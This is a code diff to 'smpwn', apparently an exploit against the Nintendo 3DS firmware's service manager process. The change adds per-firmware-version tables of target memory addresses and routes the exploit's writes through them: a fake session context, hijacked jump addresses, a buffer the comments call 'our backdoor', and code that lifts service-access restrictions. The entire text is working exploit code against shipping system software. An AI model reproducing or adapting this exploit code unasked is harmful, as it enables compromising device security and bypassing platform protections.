@@ -20,18 +20,38 @@ typedef struct SmConstants {
     u32 nbKipsAddr;
 } SmConstants;
 
-static const SmConstants s_constants = {
+// Not sure about 9.2 and below, but we don't care anyway (as memchunkhax is used there)
+static const SmConstants s_constants_93_94_95 = {
     .tlsAddr                    = 0x1FF85000,
     .staticBuffer0Addr          = 0x10ADFC,
     .serviceHandlerTableAddr    = 0x105014,
     .managerAddr                = 0x106C80,
     .serviceManager             = 0x109F6C,
     .cmdReplayInfoManager       = 0x10ABF4,
-    .jumpAddr                   = 0x102444,
+    .jumpAddr                   = 0x1023E0,
     .jumpAddr2                  = 0x10021C,
     .nbSrvPmSessionsAddr        = 0x106000,
     .nbKipsAddr                 = 0x106C9C,
 };
+
+// 9.6+
+static const SmConstants s_constants_latest = {
+    .tlsAddr                    = 0x1FF85000,
+    .staticBuffer0Addr          = 0x10ADFC,
+    .serviceHandlerTableAddr    = 0x105014,
+    .managerAddr                = 0x106C80,
+    .serviceManager             = 0x109F6C,
+    .cmdReplayInfoManager       = 0x10ABF4,
+    .jumpAddr                   = 0x102444, // only this changed
+    .jumpAddr2                  = 0x10021C,
+    .nbSrvPmSessionsAddr        = 0x106000,
+    .nbKipsAddr                 = 0x106C9C,
+};
+
+static inline const SmConstants *smpwnGetConstants(void)
+{
+    return KERNEL_VERSION_MINOR < 50u ? &s_constants_93_94_95 : &s_constants_latest;
+}
 
 // Some SM structures definitions
 struct SessionContext;
@@ -160,6 +180,7 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
 {
     Result res = 0;
     u16 numRegistered;
+    const SmConstants *constants = smpwnGetConstants();
 
     memset(ctx, 0, sizeof(SmpwnContext));
     TRY(svcCreateEvent(&ctx->waiterThreadWokeUpEvent, RESET_ONESHOT));
@@ -173,13 +194,13 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
     // We basically set up a static buffer pointing... to the static buffer descriptor area itself!
 
     // NOTE: fakeSessionCtxLoc CANNOT be on TLS since the MSByte is non-zero and it'll clear the 5th byte...
-    u32 fakeSessionCtxLoc = s_constants.staticBuffer0Addr;
-    u32 staticBufsAddr = s_constants.tlsAddr + 0x180;
+    u32 fakeSessionCtxLoc = constants->staticBuffer0Addr;
+    u32 staticBufsAddr = constants->tlsAddr + 0x180;
     u32 jumpAddrLoc = fakeSessionCtxLoc + 0x14 + 2*4; // &c.serviceInfo.replayCmdbuf[2]
-    u32 handlerId = (u32)((s32)(jumpAddrLoc - s_constants.serviceHandlerTableAddr)) >> 2;
+    u32 handlerId = (u32)((s32)(jumpAddrLoc - constants->serviceHandlerTableAddr)) >> 2;
 
     SessionContext c = {
-        .manager = (void *)s_constants.managerAddr, // doesn't really matter
+        .manager = (void *)constants->managerAddr, // doesn't really matter
         .pid = 0,                                       // doesn't really matter either
         .serviceInfo = {
             .handle = 0,                                // r4
@@ -188,9 +209,9 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
             .replayCmdbuf = {
                 staticBufsAddr + 4,                     // r2 - Address
                 0,                                      // r3
-                s_constants.jumpAddr,               // overriden r4 - We'll use it for temporary storage
+                constants->jumpAddr,               // overriden r4 - We'll use it for temporary storage
                 0,                                      // overriden r9
-                s_constants.jumpAddr2,              // r12 - Second address to jump to
+                constants->jumpAddr2,              // r12 - Second address to jump to
             },
         },
     };
@@ -214,7 +235,7 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
 
     svcClearEvent(ctx->waiterThreadWokeUpEvent);
     for (numRegistered = 0; ; numRegistered++) {
-        svcSleepThread(1 * 1000 * 1000LL); // Give time for our replay info makes it to the top.
+        svcSleepThread(10 * 1000 * 1000LL); // Give time for our replay info makes it to the top.
         TRY(smWrite8(ctx, fakeSessionCtxLoc, 0));
 
         // Try to wake up the thread
@@ -254,7 +275,7 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
     // Also prepare LazyPixie buffers for < 11.12.
     u32 staticBufs[16*2] = {
         IPC_Desc_StaticBuffer(0x110, 0), // Original static buffer for srv:pm RegisterProcess
-        s_constants.staticBuffer0Addr,
+        constants->staticBuffer0Addr,
 
         IPC_Desc_StaticBuffer((16 - 2)*8, 1),
         staticBufsAddr + 2*8, // our backdoor
@@ -291,8 +312,10 @@ Result smPartiallyCleanupSmpwn(const SmpwnContext *ctx)
 {
     Result res = 0;
     u16 nbReplayEntries = 0;
-    TRY(smWriteData(ctx, s_constants.serviceManager + 0, &ctx->initialServiceCount, 2)); // u16@0 = number of services
-    TRY(smWriteData(ctx, s_constants.cmdReplayInfoManager + 0, &nbReplayEntries, 2)); // u16@0 = number of entries
+    const SmConstants *constants = smpwnGetConstants();
+
+    TRY(smWriteData(ctx, constants->serviceManager + 0, &ctx->initialServiceCount, 2)); // u16@0 = number of services
+    TRY(smWriteData(ctx, constants->cmdReplayInfoManager + 0, &nbReplayEntries, 2)); // u16@0 = number of entries
     return res;
 }
 
@@ -301,9 +324,10 @@ Result smRemoveRestrictions(const SmpwnContext *ctx)
     Result res = 0;
     s32 nbSrvPmSessions = INT_MIN;
     s16 nbKips = SHRT_MIN;
+    const SmConstants *constants = smpwnGetConstants();
 
-    TRY(smWriteData(ctx, s_constants.nbSrvPmSessionsAddr, &nbSrvPmSessions, 4));
-    TRY(smWriteData(ctx, s_constants.nbKipsAddr, &nbKips, 2));
+    TRY(smWriteData(ctx, constants->nbSrvPmSessionsAddr, &nbSrvPmSessions, 4));
+    TRY(smWriteData(ctx, constants->nbKipsAddr, &nbKips, 2));
 
     return res;
 }
